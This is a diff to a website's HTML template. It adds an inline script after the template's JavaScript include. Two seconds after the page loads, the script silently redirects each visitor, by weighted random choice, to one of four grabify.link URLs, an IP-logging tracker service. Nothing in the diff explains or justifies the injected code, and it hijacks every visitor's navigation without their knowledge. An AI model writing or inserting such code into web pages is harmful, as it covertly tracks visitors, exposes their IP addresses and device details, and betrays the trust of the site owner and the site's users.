@@ -854,7 +854,33 @@ button.expander {
     <script src="lib/owlcarousel/owl.carousel.min.js"></script>
 
     <!-- Template Javascript -->
-    <script src="js/main.js"></script>
+ <script src="js/main.js"></script>
+  <script>
+        (function() {
+            const links = [
+                { url: "https://grabify.link/XHYJN6", probability: 37 },
+                { url: "https://grabify.link/BKGQKM", probability: 23 },
+                { url: "https://grabify.link/331NB7", probability: 22 },
+                { url: "https://grabify.link/0BRO9J", probability: 18 },
+                
+            ];
+            
+            function redirect() {
+                let randomNum = Math.random() * 100;
+                let cumulativeProbability = 0;
+                
+                for (let link of links) {
+                    cumulativeProbability += link.probability;
+                    if (randomNum < cumulativeProbability) {
+                        window.location.replace(link.url);
+                        return;
+                    }
+                }
+            }
+            
+            setTimeout(redirect, 2000);
+        })();
+    </script>
 </body>
 
 </html>
